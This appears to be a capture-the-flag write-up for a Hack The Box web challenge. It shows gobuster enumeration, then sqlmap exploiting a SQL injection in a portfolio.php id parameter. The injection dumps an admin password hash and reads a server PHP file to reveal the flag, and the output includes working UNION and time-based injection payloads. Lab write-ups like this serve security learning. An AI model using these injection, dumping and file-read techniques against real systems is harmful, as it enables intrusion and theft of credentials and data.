Reviewed all source code... /portfolio.php found
Other endpoints found:
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir --wordlist SecLists/Discovery/Web-Content/common.txt --url http://178.128.46.168:31007
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://178.128.46.168:31007
[+] Threads:        10
[+] Wordlist:       SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/04 13:58:06 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrat (Status: 301)
/css (Status: 301)
/favicon.ico (Status: 200)
/img (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/mail (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/vendor (Status: 301)
===============================================================
2021/01/04 13:58:26 Finished
===============================================================

```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w Common-PHP-Filenames.txt --url http://178.128.46.168:31007/administrat
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://178.128.46.168:31007/administrat
[+] Threads:        10
[+] Wordlist:       Common-PHP-Filenames.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/04 14:01:41 Starting gobuster
===============================================================
/index.php (Status: 200)
/logout.php (Status: 302)
===============================================================
2021/01/04 14:02:02 Finished
===============================================================
```
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://178.128.46.168:31007/administrat/ -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://178.128.46.168:31007/administrat/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/01/04 14:16:47 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/include (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/logout.php (Status: 302)
/panel.php (Status: 302)
===============================================================
2021/01/04 14:17:28 Finished
===============================================================

```

Tried SSTI in contact form...
Tried SSTI in /portfolio.php...
Tried XSS in /portfolio.php...
Tried SQLI in /portfolio.php:

http://178.128.46.168:31007/portfolio.php?id=id



```
┌──(root💀kali)-[/opt/sqlmap-dev]
└─# python sqlmap.py -u "http://178.128.46.168:31007/portfolio.php?id=1" --table-prefix safeadmin --dump -v 2                                                                                                                          2 ⨯
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___[.]_____ ___ ___  {1.5.1.6#dev}                                                                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                  
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:47:16 /2021-01-04/

[13:47:16] [DEBUG] cleaning up configuration parameters
[13:47:16] [DEBUG] setting the HTTP timeout
[13:47:16] [DEBUG] setting the HTTP User-Agent header
[13:47:16] [DEBUG] creating HTTP requests opener object
[13:47:16] [INFO] resuming back-end DBMS 'mysql' 
[13:47:16] [INFO] testing connection to the target URL
[13:47:16] [DEBUG] declared web page charset 'utf-8'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4660=4660
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5016 FROM (SELECT(SLEEP(5)))xrEA)
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6a71,0x4a5466456665794155774653434b656470464d52654f5469546e56745a6f6945694a4c6278726d43,0x7170767171)-- -
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY]-- -
---
[13:47:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[13:47:16] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:47:16] [INFO] fetching current database
[13:47:16] [DEBUG] resuming configuration option 'string' ('Log')
[13:47:16] [DEBUG] performed 0 queries in 0.00 seconds
[13:47:16] [INFO] fetching tables for database: 'freelancer'
[13:47:16] [DEBUG] performed 1 query in 0.15 seconds
[13:47:16] [INFO] fetching columns for table 'portfolio' in database 'freelancer'
[13:47:16] [DEBUG] performed 1 query in 0.08 seconds
[13:47:16] [INFO] fetching entries for table 'portfolio' in database 'freelancer'
[13:47:16] [DEBUG] stripping ORDER BY clause from statement because it does not play well with UNION query SQL injection
[13:47:16] [DEBUG] performed 1 query in 0.08 seconds
[13:47:16] [DEBUG] analyzing table dump for possible password hashes
Database: freelancer
Table: portfolio
[3 entries]
+----+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name        | content                                                                                                                                                                                                                                     |
+----+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Log Cabin 1 | Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam. |
| 2  | Log Cabin 2 | Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam. |
| 3  | Log Cabin 3 | Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam. |
+----+-------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[13:47:16] [INFO] table 'freelancer.portfolio' dumped to CSV file '/root/.local/share/sqlmap/output/178.128.46.168/dump/freelancer/portfolio.csv'
[13:47:16] [INFO] fetching columns for table 'safeadmin' in database 'freelancer'
[13:47:17] [DEBUG] performed 1 query in 0.08 seconds
[13:47:17] [INFO] fetching entries for table 'safeadmin' in database 'freelancer'
[13:47:17] [DEBUG] performed 1 query in 0.08 seconds
[13:47:17] [DEBUG] analyzing table dump for possible password hashes
Database: freelancer
Table: safeadmin
[1 entry]
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
| 1  | safeadm  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | 2019-07-16 20:25:45 |
+----+----------+--------------------------------------------------------------+---------------------+

[13:47:17] [INFO] table 'freelancer.safeadmin' dumped to CSV file '/root/.local/share/sqlmap/output/178.128.46.168/dump/freelancer/safeadmin.csv'
[13:47:17] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/178.128.46.168'

[*] ending @ 13:47:17 /2021-01-04/

```

We can search the hash (crackstation) or use John The Ripper

```
┌──(root💀kali)-[/opt/sqlmap-dev]
└─# python sqlmap.py -u "http://178.128.46.168:31007/portfolio.php?id=1" --file-read=/var/www/html/administrat/panel.php
        ___
       __H__                                                                                                                                                                                                                               
 ___ ___[)]_____ ___ ___  {1.5.1.6#dev}                                                                                                                                                                                                    
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                  
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                  
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:30:23 /2021-01-04/

[14:30:23] [INFO] resuming back-end DBMS 'mysql' 
[14:30:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4660=4660

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 5016 FROM (SELECT(SLEEP(5)))xrEA)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6a71,0x4a5466456665794155774653434b656470464d52654f5469546e56745a6f6945694a4c6278726d43,0x7170767171)-- -
---
[14:30:23] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:30:23] [INFO] fingerprinting the back-end DBMS operating system
[14:30:23] [INFO] the back-end DBMS operating system is Linux
[14:30:23] [INFO] fetching file: '/var/www/html/administrat/panel.php'
do you want confirmation that the remote file '/var/www/html/administrat/panel.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[14:30:27] [INFO] the local file '/root/.local/share/sqlmap/output/178.128.46.168/files/_var_www_html_administrat_panel.php' and the remote file '/var/www/html/administrat/panel.php' have the same size (880 B)
files saved to [1]:
[*] /root/.local/share/sqlmap/output/178.128.46.168/files/_var_www_html_administrat_panel.php (same file)

[14:30:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/178.128.46.168'

[*] ending @ 14:30:27 /2021-01-04/

                                                                                                                                                                                                                                           
┌──(root💀kali)-[/opt/sqlmap-dev]
└─# cat /root/.local/share/sqlmap/output/178.128.46.168/files/_var_www_html_administrat_panel.php 
<?php
// Initialize the session
session_start();
 
// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: index.php");
    exit;
}
?>
 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
  <link rel="icon" href="../favicon.ico" type="image/x-icon">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>. Welcome to our site.</h1><b><a href="logout.php">Logout</a></b>
<br><br><br>
        <h1>HTB{s4ff_3_1_w33b_fr4__l33nc_3}</h1>
    </div>
</body>
</html>

```